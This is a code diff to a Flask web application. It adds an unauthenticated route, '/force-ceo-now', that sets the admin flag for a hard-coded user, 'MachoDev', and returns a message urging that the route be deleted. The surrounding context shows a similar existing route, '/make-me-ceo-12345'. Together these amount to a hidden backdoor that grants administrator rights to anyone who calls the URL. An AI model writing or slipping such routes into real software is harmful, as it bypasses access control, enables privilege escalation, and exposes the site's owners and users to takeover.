@@ -410,7 +410,17 @@ def view_story(story_id):
     story = c.fetchone()
     conn.close()
     return render_template('view_story.html', story=story)
-
+    
+@app.route('/force-ceo-now')
+def force_ceo_now():
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("UPDATE users SET is_admin = TRUE WHERE username = %s", ('MachoDev',))
+    conn.commit()
+    c.execute("SELECT username, is_admin FROM users WHERE username = %s", ('MachoDev',))
+    result = c.fetchone()
+    conn.close()
+    return f"CEO FORCED! DB says: {result['username']} | is_admin = {result['is_admin']}. DELETE THIS ROUTE NOW!"
 @app.route('/make-me-ceo-12345')
 def make_me_ceo():
     conn = get_db()
